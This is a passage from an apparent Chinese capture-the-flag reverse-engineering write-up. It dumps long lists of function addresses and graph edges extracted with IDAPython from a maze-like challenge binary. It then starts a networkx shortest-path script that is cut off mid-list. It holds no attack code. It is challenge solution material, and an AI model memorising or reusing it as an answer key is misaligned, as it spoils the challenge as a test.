4263920, 4257312], [None, None, 4264080, 4257472], [None, None, 4265200, 4257760], [None, None, 4265344, 4257920], [None, None, 4265504, 4258080], [None, None, 4265648, 4258240], [None, 4259648, 4265792, None], [4259488, 4259808, None, None], [4259648, 4259968, None, None], [4259808, 4260128, None, None], [4259968, None, 4265952, None], [None, 4260448, 4266112, None], [4260288, 4260592, None, None], [4260448, 4260752, None, None], [4260592, 4260912, None, None], [4260752, 4261072, None, None], [4260912, 4261232, None, None], [4261072, 4261392, None, None], [4261232, 4261552, None, None], [4261392, 4261712, None, None], [4261552, 4261872, None, None], [4261712, 4262032, None, None], [4261872, 4262176, None, None], [4262032, 4262320, None, None], [4262176, 4262480, None, None], [4262320, 4262640, None, None], [4262480, 4262800, None, None], [4262640, 4262960, None, None], [4262800, 4263120, None, None], [4262960, 4263280, None, None], [4263120, 4263440, None, None], [4263280, 4263600, None, None], [4263440, None, 4266272, None], [None, None, 4268496, 4258400], [None, None, 4268656, 4258544], [None, 4264240, None, 4258704], [4264080, 4264400, None, None], [4264240, 4264560, None, None], [4264400, 4264720, None, None], [4264560, 4264880, None, None], [4264720, 4265040, None, None], [4264880, 4265200, None, None], [4265040, None, None, 4258864], [None, None, 4268816, 4259024], [None, None, 4268976, 4259184], [None, None, 4269136, 4259344], [None, None, 4269296, 4259488], [None, None, 4269456, 4260128], [None, None, 4269616, 4260288], [None, 4266432, None, 4263600], [4266272, 4266592, None, None], [4266432, 4266752, None, None], [4266592, 4266912, None, None], [4266752, 4267072, None, None], [4266912, 4267232, None, None], [4267072, 4267392, None, None], [4267232, 4267552, None, None], [4267392, 4267712, None, None], [4267552, 4267872, None, None], [4267712, 4268032, None, None], [4267872, 4268192, None, None], [4268032, 4268352, None, None], [4268192, 4268496, None, None], [4268352, None, None, 4263760], [None, None, 4269760, 4263920], [None, None, 4272288, 4265344], [None, None, 4272448, 4265504], [None, None, 4272608, 4265648], [None, None, 4273392, 4265792], [None, None, 4273552, 4265952], [None, None, 4273696, 4266112], [None, 4269920, None, 4268656], [4269760, 4270080, None, None], [4269920, 4270240, None, None], [4270080, 4270400, None, None], [4270240, 4270560, None, None], [4270400, 4270720, None, None], [4270560, 4270880, None, None], [4270720, 4271040, None, None], [4270880, 4271184, None, None], [4271040, 4271328, None, None], [4271184, 4271488, None, None], [4271328, 4271648, None, None], [4271488, 4271808, None, None], [4271648, 4271968, None, None], [4271808, 4272128, None, None], [4271968, 4272288, None, None], [4272128, None, None, 4268816], [None, None, 4274480, 4268976], [None, 4272768, None, 4269136], [4272608, 4272928, None, None], [4272768, 4273088, None, None], [4272928, 4273248, None, None], [4273088, 4273392, None, None], [4273248, None, None, 4269296], [None, None, 4274640, 4269456], [None, None, 4274800, 4269616], [None, 4274000, 4277808, None], [4273840, 4274160, None, None], [4274000, 4274320, None, None], [4274160, None, 4277968, None], [None, None, 4284896, 4272448], [None, None, 4286496, 4273552], [None, 4274960, None, 4273696], [4274800, 4275120, None, None], [4274960, 4275280, None, None], [4275120, 4275440, None, None], [4275280, 4275584, None, None], [4275440, 4275744, None, None], [4275584, 4275904, None, None], [4275744, 4276064, None, None], [4275904, 4276208, None, None], [4276064, 4276368, None, None], [4276208, 4276528, None, None], [4276368, 4276688, None, None], [4276528, 4276848, None, None], [4276688, 4277008, None, None], [4276848, 4277168, None, None], [4277008, 4277328, None, None], [4277168, 4277488, None, None], [4277328, 4277648, None, None], [4277488, 4277808, None, None], [4277648, None, None, 4273840], [None, 4278128, None, 4274320], [4277968, 4278288, None, None], [4278128, 4278448, None, None], [4278288, 4278608, None, None], [4278448, 4278768, None, None], [4278608, 4278928, None, None], [4278768, 4279072, None, None], [4278928, 4279216, None, None], [4279072, 4279376, None, None], [4279216, 4279536, None, None], [4279376, 4279696, None, None], [4279536, 4279840, None, None], [4279696, 4280000, None, None], [4279840, 4280160, None, None], [4280000, 4280304, None, None], [4280160, 4280464, None, None], [4280304, 4280624, None, None], [4280464, 4280784, None, None], [4280624, 4280944, None, None], [4280784, 4281088, None, None], [4280944, 4281248, None, None], [4281088, 4281408, None, None], [4281248, 4281568, None, None], [4281408, 4281728, None, None], [4281568, 4281888, None, None], [4281728, 4282048, None, None], [4281888, 4282208, None, None], [4282048, 4282352, None, None], [4282208, 4282512, None, None], [4282352, 4282656, None, None], [4282512, 4282816, None, None], [4282656, 4282976, None, None], [4282816, 4283136, None, None], [4282976, 4283296, None, None], [4283136, 4283456, None, None], [4283296, 4283616, None, None], [4283456, 4283776, None, None], [4283616, 4283936, None, None], [4283776, 4284096, None, None], [4283936, 4284256, None, None], [4284096, 4284416, None, None], [4284256, 4284576, None, None], [4284416, 4284736, None, None], [4284576, 4284896, None, None], [4284736, None, None, 4274480], [None, 4285216, 4286656, None], [4285056, 4285376, None, None], [4285216, 4285536, None, None], [4285376, 4285696, None, None], [4285536, 4285856, None, None], [4285696, 4286016, None, None], [4285856, 4286176, None, None], [4286016, 4286336, None, None], [4286176, 4286496, None, None], [4286336, None, None, 4274640], [None, None, 4296976, 4285056], [None, 4286976, 4297136, None], [4286816, 4287120, None, None], [4286976, 4287264, None, None], [4287120, 4287424, None, None], [4287264, 4287584, None, None], [4287424, 4287744, None, None], [4287584, 4287904, None, None], [4287744, 4288064, None, None], [4287904, 4288224, None, None], [4288064, 4288384, None, None], [4288224, 4288528, None, None], [4288384, 4288688, None, None], [4288528, 4288848, None, None], [4288688, 4288992, None, None], [4288848, 4289152, None, None], [4288992, 4289312, None, None], [4289152, 4289472, None, None], [4289312, 4289632, None, None], [4289472, 4289792, None, None], [4289632, 4289952, None, None], [4289792, 4290112, None, None], [4289952, 4290272, None, None], [4290112, 4290432, None, None], [4290272, 4290592, None, None], [4290432, 4290752, None, None], [4290592, 4290912, None, None], [4290752, 4291072, None, None], [4290912, 4291232, None, None], [4291072, 4291376, None, None], [4291232, 4291536, None, None], [4291376, 4291696, None, None], [4291536, 4291856, None, None], [4291696, 4292000, None, None], [4291856, 4292144, None, None], [4292000, 4292288, None, None], [4292144, 4292448, None, None], [4292288, 4292608, None, None], [4292448, 4292768, None, None], [4292608, 4292928, None, None], [4292768, 4293088, None, None], [4292928, 4293248, None, None], [4293088, 4293392, None, None], [4293248, 4293552, None, None], [4293392, 4293696, None, None], [4293552, 4293856, None, None], [4293696, 4294016, None, None], [4293856, 4294160, None, None], [4294016, 4294320, None, None], [4294160, 4294480, 4297296, None], [4294320, 4294640, None, None], [4294480, 4294800, None, None], [4294640, 4294944, None, None], [4294800, 4295088, None, None], [4294944, 4295232, None, None], [4295088, 4295392, None, None], [4295232, 4295552, None, None], [4295392, 4295696, None, None], [4295552, 4295856, None, None], [4295696, 4296016, None, None], [4295856, 4296176, None, None], [4296016, 4296336, None, None], [4296176, 4296496, None, None], [4296336, 4296656, None, None], [4296496, 4296816, None, None], [4296656, None, 4297424, None], [None, None, 4297584, 4286656], [None, None, 4297744, 4286816], [None, None, 4297904, 4294320], [None, None, 4299472, 4296816], [None, None, 4300720, 4296976], [None, None, 4302288, 4297136], [None, None, 4308576, 4297296], [None, 4298224, 4308720, None], [4298064, 4298384, None, None], [4298224, 4298528, None, None], [4298384, 4298688, None, None], [4298528, 4298848, None, None], [4298688, 4299008, None, None], [4298848, 4299168, None, None], [4299008, 4299312, None, None], [4299168, 4299472, None, None], [4299312, 4299632, None, 4297424], [4299472, 4299792, None, None], [4299632, 4299936, None, None], [4299792, 4300096, None, None], [4299936, 4300256, None, None], [4300096, 4300416, None, None], [4300256, 4300576, None, None], [4300416, None, None, None], [None, 4300864, None, 4297584], [4300720, 4301024, None, None], [4300864, 4301184, None, None], [4301024, 4301344, None, None], [4301184, 4301504, None, None], [4301344, 4301648, None, None], [4301504, 4301808, None, None], [4301648, 4301968, None, None], [4301808, 4302128, None, None], [4301968, 4302288, None, None], [4302128, 4302448, None, 4297744], [4302288, 4302608, None, None], [4302448, 4302768, None, None], [4302608, 4302912, None, None], [4302768, 4303072, None, None], [4302912, 4303232, None, None], [4303072, 4303392, None, None], [4303232, 4303552, None, None], [4303392, 4303712, None, None], [4303552, 4303872, None, None], [4303712, 4304032, None, None], [4303872, 4304192, None, None], [4304032, 4304352, None, None], [4304192, 4304496, None, None], [4304352, 4304656, None, None], [4304496, 4304816, None, None], [4304656, 4304976, None, None], [4304816, 4305136, None, None], [4304976, 4305296, None, None], [4305136, 4305456, None, None], [4305296, 4305616, None, None], [4305456, 4305776, None, None], [4305616, 4305936, None, None], [4305776, 4306096, None, None], [4305936, 4306256, None, None], [4306096, 4306400, None, None], [4306256, 4306560, None, None], [4306400, 4306720, None, None], [4306560, 4306880, None, None], [4306720, 4307024, None, None], [4306880, 4307184, None, None], [4307024, 4307344, None, None], [4307184, 4307504, None, None], [4307344, 4307664, None, None], [4307504, 4307808, None, None], [4307664, 4307968, None, None], [4307808, 4308128, None, None], [4307968, 4308288, None, None], [4308128, 4308448, None, None], [4308288, None, None, None], [None, None, 4308880, 4297904], [None, None, 4309040, 4298064], [None, None, 4311264, 4308576], [None, None, 4311888, 4308720], [None, 4309360, 4312336, None], [4309200, 4309520, 4312496, None], [4309360, None, 4312624, None], [None, None, 4313872, None], [None, 4309984, 4315312, None], [4309824, None, 4315472, None], [None, 4310304, 4316112, None], [4310144, 4310464, 4316272, None], [4310304, 4310624, 4316432, None], [4310464, 4310784, 4316592, None], [4310624, 4310944, 4316736, None], [4310784, 4311104, 4316896, None], [4310944, None, 4317024, None], [None, 4311424, 4317664, 4308880], [4311264, 4311584, 4317824, None], [4311424, 4311744, 4317984, None], [4311584, None, 4318112, None], [None, None, 4318752, 4309040], [None, 4312176, None, None], [4312048, 4312336, 4318896, None], [4312176, 4312496, None, 4309200], [4312336, 4312624, None, 4309360], [4312496, 4312784, None, 4309520], [4312624, 4312928, None, None], [4312784, 4313088, None, None], [4312928, 4313248, None, None], [4313088, 4313408, None, None], [4313248, 4313568, None, None], [4313408, 4313712, None, None], [4313568, 4313872, 4319056, None], [4313712, 4314032, None, 4309680], [4313872, 4314192, 4319200, None], [4314032, 4314352, None, None], [4314192, 4314512, None, None], [4314352, 4314672, None, None], [4314512, 4314832, None, None], [4314672, 4314992, None, None], [4314832, 4315152, None, None], [4314992, 4315312, 4319328, None], [4315152, 4315472, None, 4309824], [4315312, 4315632, None, 4309984], [4315472, 4315792, 4319472, None], [4315632, 4315952, None, None], [4315792, 4316112, None, None], [4315952, 4316272, None, 4310144], [4316112, 4316432, None, 4310304], [4316272, 4316592, None, 4310464], [4316432, 4316736, 4319616, 4310624], [4316592, 4316896, None, 4310784], [4316736, 4317024, None, 4310944], [4316896, 4317184, None, 4311104], [4317024, 4317344, None, None], [4317184, 4317504, None, None], [4317344, 4317664, 4319760, None], [4317504, 4317824, None, 4311264], [4317664, 4317984, None, 4311424], [4317824, 4318112, None, 4311584], [4317984, 4318272, None, 4311744], [4318112, 4318432, None, None], [4318272, 4318592, None, None], [4318432, 4318752, None, None], [4318592, None, None, 4311888], [None, None, 4319920, 4312176], [None, None, None, 4313712], [None, None, None, 4314032], [None, None, None, 4315152], [None, None, None, 4315632], [None, None, 4320080, 4316592], [None, None, 4320240, 4317504], [None, None, 4321472, 4318896], [None, None, 4321600, 4319616], [None, 4320400, 4321760, 4319760], [4320240, 4320560, None, None], [4320400, 4320720, None, None], [4320560, 4320880, None, None], [4320720, 4321024, None, None], [4320880, 4321184, None, None], [4321024, 4321344, None, None], [4321184, None, None, None], [None, None, None, 4319920], [None, None, 4321904, 4320080], [None, None, None, 4320240], [None, None, None, 4321600]]len(func_list): 788len(all_edges): 788[4198480, 4198624, 4198784, 4198944, 4199104, 4199264, 4199424, 4199584, 4199744, 4199904, 4200064, 4200224, 4200384, 4200544, 4200688, 4200848, 4201008, 4201168, 4201312, 4201456, 4201616, 4201776, 4201936, 4202096, 4202240, 4202384, 4202544, 4202704, 4202848, 4203008, 4203168, 4203328, 4203488, 4203648, 4203808, 4203968, 4204128, 4204272, 4204432, 4204592, 4204752, 4204912, 4205056, 4205216, 4205376, 4205536, 4205680, 4205824, 4205984, 4206144, 4206304, 4206448, 4206608, 4206768, 4206928, 4207088, 4207232, 4207392, 4207552, 4207712, 4207872, 4208032, 4208192, 4208352, 4208496, 4208656, 4208816, 4208960, 4209120, 4209280, 4209440, 4209600, 4209760, 4209904, 4210064, 4210224, 4210368, 4210528, 4210688, 4210832, 4210992, 4211152, 4211312, 4211472, 4211632, 4211792, 4211952, 4212112, 4212272, 4212432, 4212592, 4212752, 4212912, 4213072, 4213232, 4213392, 4213552, 4213696, 4213856, 4214016, 4214176, 4214320, 4214480, 4214640, 4214800, 4214960, 4215120, 4215280, 4215440, 4215584, 4215744, 4215904, 4216064, 4216208, 4216352, 4216512, 4216672, 4216832, 4216992, 4217136, 4217296, 4217440, 4217600, 4217760, 4217920, 4218080, 4218240, 4218400, 4218560, 4218720, 4218880, 4219040, 4219200, 4219360, 4219520, 4219680, 4219840, 4219984, 4220144, 4220304, 4220464, 4220608, 4220768, 4220928, 4221088, 4221232, 4221392, 4221552, 4221712, 4221872, 4222032, 4222192, 4222352, 4222496, 4222640, 4222800, 4222928, 4223088, 4223248, 4223408, 4223568, 4223712, 4223856, 4224016, 4224176, 4224336, 4224496, 4224656, 4224816, 4224976, 4225120, 4225264, 4225424, 4225584, 4225744, 4225888, 4226048, 4226208, 4226368, 4226528, 4226688, 4226848, 4227008, 4227168, 4227328, 4227488, 4227648, 4227808, 4227968, 4228112, 4228272, 4228416, 4228576, 4228736, 4228896, 4229056, 4229216, 4229376, 4229520, 4229680, 4229840, 4229984, 4230144, 4230288, 4230448, 4230608, 4230768, 4230928, 4231088, 4231248, 4231408, 4231568, 4231728, 4231888, 4232048, 4232208, 4232368, 4232528, 4232672, 4232832, 4232992, 4233152, 4233312, 4233472, 4233616, 4233776, 4233920, 4234080, 4234240, 4234400, 4234560, 4234720, 4234880, 4235040, 4235200, 4235328, 4235488, 4235632, 4235792, 4235952, 4236112, 4236272, 4236432, 4236576, 4236736, 4236896, 4237056, 4237216, 4237376, 4237520, 4237664, 4237824, 4237984, 4238144, 4238304, 4238464, 4238624, 4238784, 4238944, 4239104, 4239264, 4239424, 4239584, 4239744, 4239904, 4240064, 4240224, 4240368, 4240528, 4240688, 4240848, 4241008, 4241168, 4241312, 4241456, 4241616, 4241776, 4241936, 4242096, 4242256, 4242416, 4242576, 4242736, 4242896, 4243040, 4243200, 4243360, 4243504, 4243664, 4243824, 4243984, 4244144, 4244288, 4244448, 4244608, 4244768, 4244928, 4245072, 4245232, 4245392, 4245536, 4245696, 4245840, 4246000, 4246160, 4246320, 4246480, 4246640, 4246800, 4246960, 4247120, 4247280, 4247440, 4247600, 4247744, 4247904, 4248064, 4248224, 4248384, 4248544, 4248704, 4248864, 4249024, 4249184, 4249344, 4249504, 4249664, 4249824, 4249984, 4250144, 4250304, 4250464, 4250624, 4250784, 4250944, 4251088, 4251248, 4251408, 4251568, 4251712, 4251872, 4252032, 4252192, 4252336, 4252496, 4252656, 4252816, 4252976, 4253136, 4253296, 4253456, 4253616, 4253776, 4253936, 4254096, 4254240, 4254400, 4254544, 4254704, 4254848, 4255008, 4255152, 4255312, 4255472, 4255616, 4255776, 4255936, 4256080, 4256240, 4256400, 4256560, 4256704, 4256848, 4257008, 4257152, 4257312, 4257472, 4257632, 4257760, 4257920, 4258080, 4258240, 4258400, 4258544, 4258704, 4258864, 4259024, 4259184, 4259344, 4259488, 4259648, 4259808, 4259968, 4260128, 4260288, 4260448, 4260592, 4260752, 4260912, 4261072, 4261232, 4261392, 4261552, 4261712, 4261872, 4262032, 4262176, 4262320, 4262480, 4262640, 4262800, 4262960, 4263120, 4263280, 4263440, 4263600, 4263760, 4263920, 4264080, 4264240, 4264400, 4264560, 4264720, 4264880, 4265040, 4265200, 4265344, 4265504, 4265648, 4265792, 4265952, 4266112, 4266272, 4266432, 4266592, 4266752, 4266912, 4267072, 4267232, 4267392, 4267552, 4267712, 4267872, 4268032, 4268192, 4268352, 4268496, 4268656, 4268816, 4268976, 4269136, 4269296, 4269456, 4269616, 4269760, 4269920, 4270080, 4270240, 4270400, 4270560, 4270720, 4270880, 4271040, 4271184, 4271328, 4271488, 4271648, 4271808, 4271968, 4272128, 4272288, 4272448, 4272608, 4272768, 4272928, 4273088, 4273248, 4273392, 4273552, 4273696, 4273840, 4274000, 4274160, 4274320, 4274480, 4274640, 4274800, 4274960, 4275120, 4275280, 4275440, 4275584, 4275744, 4275904, 4276064, 4276208, 4276368, 4276528, 4276688, 4276848, 4277008, 4277168, 4277328, 4277488, 4277648, 4277808, 4277968, 4278128, 4278288, 4278448, 4278608, 4278768, 4278928, 4279072, 4279216, 4279376, 4279536, 4279696, 4279840, 4280000, 4280160, 4280304, 4280464, 4280624, 4280784, 4280944, 4281088, 4281248, 4281408, 4281568, 4281728, 4281888, 4282048, 4282208, 4282352, 4282512, 4282656, 4282816, 4282976, 4283136, 4283296, 4283456, 4283616, 4283776, 4283936, 4284096, 4284256, 4284416, 4284576, 4284736, 4284896, 4285056, 4285216, 4285376, 4285536, 4285696, 4285856, 4286016, 4286176, 4286336, 4286496, 4286656, 4286816, 4286976, 4287120, 4287264, 4287424, 4287584, 4287744, 4287904, 4288064, 4288224, 4288384, 4288528, 4288688, 4288848, 4288992, 4289152, 4289312, 4289472, 4289632, 4289792, 4289952, 4290112, 4290272, 4290432, 4290592, 4290752, 4290912, 4291072, 4291232, 4291376, 4291536, 4291696, 4291856, 4292000, 4292144, 4292288, 4292448, 4292608, 4292768, 4292928, 4293088, 4293248, 4293392, 4293552, 4293696, 4293856, 4294016, 4294160, 4294320, 4294480, 4294640, 4294800, 4294944, 4295088, 4295232, 4295392, 4295552, 4295696, 4295856, 4296016, 4296176, 4296336, 4296496, 4296656, 4296816, 4296976, 4297136, 4297296, 4297424, 4297584, 4297744, 4297904, 4298064, 4298224, 4298384, 4298528, 4298688, 4298848, 4299008, 4299168, 4299312, 4299472, 4299632, 4299792, 4299936, 4300096, 4300256, 4300416, 4300576, 4300720, 4300864, 4301024, 4301184, 4301344, 4301504, 4301648, 4301808, 4301968, 4302128, 4302288, 4302448, 4302608, 4302768, 4302912, 4303072, 4303232, 4303392, 4303552, 4303712, 4303872, 4304032, 4304192, 4304352, 4304496, 4304656, 4304816, 4304976, 4305136, 4305296, 4305456, 4305616, 4305776, 4305936, 4306096, 4306256, 4306400, 4306560, 4306720, 4306880, 4307024, 4307184, 4307344, 4307504, 4307664, 4307808, 4307968, 4308128, 4308288, 4308448, 4308576, 4308720, 4308880, 4309040, 4309200, 4309360, 4309520, 4309680, 4309824, 4309984, 4310144, 4310304, 4310464, 4310624, 4310784, 4310944, 4311104, 4311264, 4311424, 4311584, 4311744, 4311888, 4312048, 4312176, 4312336, 4312496, 4312624, 4312784, 4312928, 4313088, 4313248, 4313408, 4313568, 4313712, 4313872, 4314032, 4314192, 4314352, 4314512, 4314672, 4314832, 4314992, 4315152, 4315312, 4315472, 4315632, 4315792, 4315952, 4316112, 4316272, 4316432, 4316592, 4316736, 4316896, 4317024, 4317184, 4317344, 4317504, 4317664, 4317824, 4317984, 4318112, 4318272, 4318432, 4318592, 4318752, 4318896, 4319056, 4319200, 4319328, 4319472, 4319616, 4319760, 4319920, 4320080, 4320240, 4320400, 4320560, 4320720, 4320880, 4321024, 4321184, 4321344, 4321472, 4321600, 4321760, 4321904] 对于IDAPython简单函数的学习，可以参考 https://zzzzsky.com/2021/12/08/LearnIDAPython/ 至此，我们找到了所有的节点，以及每个节点对应的adsw对应的4个值，如果为None说明不通，如果不为None，说明是进入的另外一个函数，就可以构造一条边 networkx求最短路径写python脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445import networkx as nximport hashliball_edges = [[None, 4198624, None, None], [4198480, None, 4198784, None], [None, None, 4207712, 4198624], [None, 4199104, 4211312, None], [4198944, 4199264, None, None], [4199104, 4199424, None, None], [4199264, 4199584, None, None], [4199424, 4199744, None, None], [4199584, 4199904, 4211472, None], [4199744, 4200064, None, None], [4199904, 4200224, None, None], [4200064, 4200384, None, None], [4200224, 4200544, None, None], [4200384, 4200688, None, None], [4200544, 4200848, None, None], [4200688, 4201008, None, None], [4200848, 4201168, None, None], [4201008, 4201312, None, None], [4201168, 4201456, None, None], [4201312, 4201616, None, None], [4201456, 4201776, None, None], [4201616, 4201936, None, None], [4201776, 4202096, None, None], [4201936, 4202240, None, None], [4202096, 4202384, None, None], [4202240, 4202544, None, None], [4202384, 4202704, None, None], [4202544, 4202848, None, None], [4202704, 4203008, None, None], [4202848, 4203168, None, None], [4203008, 4203328, None, None], [4203168, 4203488, None, None], [4203328, 4203648, None, None], [4203488, 4203808, None, None], [4203648, 4203968, None, None], [4203808, 4204128, None, None], [4203968, 4204272, None, None], [4204128, 4204432, None, None], [4204272, 4204592, None, None], [4204432, 4204752, None, None], [4204592, 4204912, None, None], [4204752, 4205056, None, None], [4204912, 4205216, None, None], [4205056, 4205376, None, None], [4205216, 4205536, None, None], [4205376, None, 4211632, None], [None, 4205824, 4211792, None], [4205680, 4205984, None, None], [4205824, 4206144, None, None], [4205984, 4206304, None, None], [4206144, 4206448, None, None], [4206304, 4206608, None, None], [4206448, 4206768, None, None], [4206608, 4206928, None, None], [4206768, 4207088, None, None], [4206928, 4207232, None, None], [4207088, 4207392, None, None], [4207232, 4207552, None, None], [4207392, None, 4211952, None], [None, 4207872, None, 4198784], [4207712, 4208032, None, None], [4207872, 4208192, None, None], [4208032, 4208352, None, None], [4208192, 4208496, None, None], [4208352, 4208656, None, None], [4208496, 4208816, None, None], [4208656, 4208960, None, None], [4208816, 4209120, 4212112, None], [4208960, 4209280, None, None], [4209120, 4209440, None, None], [4209280, 4209600, None, None], [4209440, 4209760, None, None], [4209600, 4209904, None, None], [4209760, 4210064, None, None], [4209904, 4210224, None, None], [4210064, 4210368, None, None], [4210224, 4210528, None, None], [4210368, 4210688, 4212272, None], [4210528, 4210832, None, None], [4210688, 4210992, None, None], [4210832, 4211152, None, None], [4210992, 4211312, None, None], [4211152, None, None, 4198944], [None, None, 4212432, 4199744], [None, None, 4216832, 4205536], [None, None, 4216992, 4205680], [None, None, 4217136, 4207552], [None, None, 4218240, 4208960], [None, None, 4218400, 4210528], [None, None, 4218560, 4211472], [None, 4212752, 4218720, None], [4212592, 4212912, None, None], [4212752, 4213072, None, None], [4212912, 4213232, None, None], [4213072, 4213392, None, None], [4213232, 4213552, None, None], [4213392, 4213696, None, None], [4213552, 4213856, None, None], [4213696, 4214016, None, None], [4213856, 4214176, None, None], [4214016, 4214320, None, None], [4214176, 4214480, None, None], [4214320, 4214640, None, None], [4214480, 4214800, None, None], [4214640, 4214960, None, None], [4214800, 4215120, None, None], [4214960, 4215280, None, None], [4215120, 4215440, None, None], [4215280, 4215584, None, None], [4215440, 4215744, None, None], [4215584, 4215904, None, None], [4215744, 4216064, None, None], [4215904, 4216208, None, None], [4216064, 4216352, None, None], [4216208, 4216512, None, None], [4216352, 4216672, None, None], [4216512, None, 4218880, None], [None, None, 4219040, 4211632], [None, None, 4219200, 4211792], [None, None, 4219360, 4211952], [None, 4217440, 4219520, None], [4217296, 4217600, None, None], [4217440, 4217760, None, None], [4217600, 4217920, None, None], [4217760, 4218080, None, None], [4217920, None, 4219680, None], [None, None, 4219840, 4212112], [None, None, 4219984, 4212272], [None, None, 4220144, 4212432], [None, None, 4220304, 4212592], [None, None, 4220464, 4216672], [None, None, 4220608, 4216832], [None, None, 4220768, 4216992], [None, None, 4222032, 4217136], [None, None, 4222192, 4217296], [None, None, 4222352, 4218080], [None, None, 4222496, 4218240], [None, None, 4222640, 4218400], [None, None, 4223248, 4218560], [None, None, 4223856, 4218720], [None, None, 4225584, 4218880], [None, None, 4225744, 4219040], [None, 4220928, None, 4219200], [4220768, 4221088, None, None], [4220928, 4221232, None, None], [4221088, 4221392, None, None], [4221232, 4221552, None, None], [4221392, 4221712, None, None], [4221552, 4221872, None, None], [4221712, None, 4225888, None], [None, None, 4226048, 4219360], [None, None, 4226208, 4219520], [None, None, 4226688, 4219680], [None, None, 4227008, 4219840], [None, None, 4227168, 4219984], [None, 4222928, None, None], [4222800, 4223088, None, None], [4222928, 4223248, None, None], [4223088, 4223408, None, 4220144], [4223248, 4223568, None, None], [4223408, 4223712, None, None], [4223568, None, None, None], [None, None, 4227328, 4220304], [None, 4224176, 4227488, None], [4224016, 4224336, None, None], [4224176, 4224496, None, None], [4224336, 4224656, None, None], [4224496, 4224816, None, None], [4224656, 4224976, None, None], [4224816, 4225120, None, None], [4224976, 4225264, None, None], [4225120, 4225424, None, None], [4225264, None, 4227648, None], [None, None, 4227808, 4220464], [None, None, 4227968, 4220608], [None, None, 4228112, 4221872], [None, None, 4228272, 4222032], [None, None, 4228576, 4222192], [None, 4226528, 4228736, None], [4226368, 4226688, None, None], [4226528, None, None, 4222352], [None, 4227008, 4228896, None], [4226848, None, None, 4222496], [None, None, 4229056, 4222640], [None, None, 4229680, 4223856], [None, None, 4229840, 4224016], [None, None, 4230928, 4225424], [None, None, 4231088, 4225584], [None, None, 4231248, 4225744], [None, None, 4232208, 4225888], [None, 4228416, None, 4226048], [4228272, None, 4232368, None], [None, None, 4232672, 4226208], [None, None, 4232832, 4226368], [None, None, 4232992, 4226848], [None, None, 4233152, 4227168], [None, 4229376, 4233312, None], [4229216, 4229520, None, None], [4229376, 4229680, None, None], [4229520, None, None, 4227328], [None, 4229984, None, 4227488], [4229840, 4230144, None, None], [4229984, 4230288, None, None], [4230144, 4230448, None, None], [4230288, 4230608, None, None], [4230448, 4230768, None, None], [4230608, None, 4233472, None], [None, None, 4233616, 4227648], [None, None, 4233776, 4227808], [None, None, 4233920, 4227968], [None, 4231568, 4234080, None], [4231408, 4231728, None, None], [4231568, 4231888, None, None], [4231728, 4232048, None, None], [4231888, None, 4234240, None], [None, None, 4234400, 4228112], [None, 4232528, None, 4228416], [4232368, None, 4234560, None], [None, None, 4234880, 4228576], [None, None, 4235328, 4228736], [None, None, 4235792, 4228896], [None, None, 4236576, 4229056], [None, None, 4236736, 4229216], [None, None, 4238784, 4230768], [None, None, 4238944, 4230928], [None, None, 4239104, 4231088], [None, None, 4239264, 4231248], [None, None, 4239424, 4231408], [None, None, 4239584, 4232048], [None, None, 4239744, 4232208], [None, 4234720, None, 4232528], [4234560, None, 4239904, None], [None, 4235040, None, 4232672], [4234880, 4235200, None, None], [4235040, 4235328, None, None], [4235200, None, 4240064, 4232832], [None, 4235632, 4240368, None], [4235488, 4235792, None, None], [4235632, 4235952, None, 4232992], [4235792, 4236112, None, None], [4235952, 4236272, None, None], [4236112, 4236432, None, None], [4236272, None, None, None], [None, None, 4240528, 4233152], [None, 4236896, None, 4233312], [4236736, 4237056, None, None], [4236896, 4237216, None, None], [4237056, 4237376, None, None], [4237216, 4237520, None, None], [4237376, 4237664, None, None], [4237520, 4237824, None, None], [4237664, 4237984, None, None], [4237824, 4238144, None, None], [4237984, 4238304, None, None], [4238144, 4238464, None, None], [4238304, 4238624, None, None], [4238464, 4238784, None, None], [4238624, None, None, 4233472], [None, None, 4240688, 4233616], [None, None, 4240848, 4233776], [None, None, 4241008, 4233920], [None, None, 4241168, 4234080], [None, None, 4241312, 4234240], [None, None, 4241456, 4234400], [None, None, 4241616, 4234720], [None, 4240224, None, 4235328], [4240064, 4240368, None, None], [4240224, None, None, 4235488], [None, None, 4241776, 4236576], [None, None, 4246640, 4238944], [None, None, 4246800, 4239104], [None, None, 4246960, 4239264], [None, None, 4247120, 4239424], [None, None, 4247280, 4239584], [None, None, 4247440, 4239744], [None, None, 4247904, 4239904], [None, 4241936, None, 4240528], [4241776, 4242096, None, None], [4241936, 4242256, None, None], [4242096, 4242416, None, None], [4242256, 4242576, None, None], [4242416, 4242736, None, None], [4242576, 4242896, None, None], [4242736, 4243040, None, None], [4242896, 4243200, None, None], [4243040, 4243360, None, None], [4243200, 4243504, None, None], [4243360, 4243664, None, None], [4243504, 4243824, None, None], [4243664, 4243984, None, None], [4243824, 4244144, None, None], [4243984, 4244288, None, None], [4244144, 4244448, None, None], [4244288, 4244608, None, None], [4244448, 4244768, None, None], [4244608, 4244928, None, None], [4244768, 4245072, None, None], [4244928, 4245232, None, None], [4245072, 4245392, None, None], [4245232, 4245536, None, None], [4245392, 4245696, None, None], [4245536, 4245840, None, None], [4245696, 4246000, None, None], [4245840, 4246160, None, None], [4246000, 4246320, None, None], [4246160, 4246480, None, None], [4246320, 4246640, None, None], [4246480, None, None, 4240688], [None, None, 4248064, 4240848], [None, None, 4248224, 4241008], [None, None, 4248384, 4241168], [None, None, 4248544, 4241312], [None, None, 4248704, 4241456], [None, None, 4248864, None], [None, 4247904, 4249184, None], [4247744, None, None, 4241616], [None, None, 4257312, 4246800], [None, None, 4257472, 4246960], [None, None, 4257632, 4247120], [None, None, 4257760, 4247280], [None, None, 4257920, 4247440], [None, 4249024, 4258080, 4247600], [4248864, 4249184, None, None], [4249024, None, None, 4247744], [None, 4249504, 4258240, None], [4249344, 4249664, None, None], [4249504, 4249824, None, None], [4249664, 4249984, None, None], [4249824, 4250144, None, None], [4249984, 4250304, None, None], [4250144, 4250464, None, None], [4250304, 4250624, None, None], [4250464, 4250784, None, None], [4250624, 4250944, None, None], [4250784, 4251088, None, None], [4250944, 4251248, None, None], [4251088, 4251408, None, None], [4251248, 4251568, None, None], [4251408, 4251712, None, None], [4251568, 4251872, None, None], [4251712, 4252032, None, None], [4251872, 4252192, None, None], [4252032, 4252336, None, None], [4252192, 4252496, None, None], [4252336, 4252656, None, None], [4252496, 4252816, None, None], [4252656, 4252976, None, None], [4252816, 4253136, None, None], [4252976, 4253296, None, None], [4253136, 4253456, None, None], [4253296, 4253616, None, None], [4253456, 4253776, None, None], 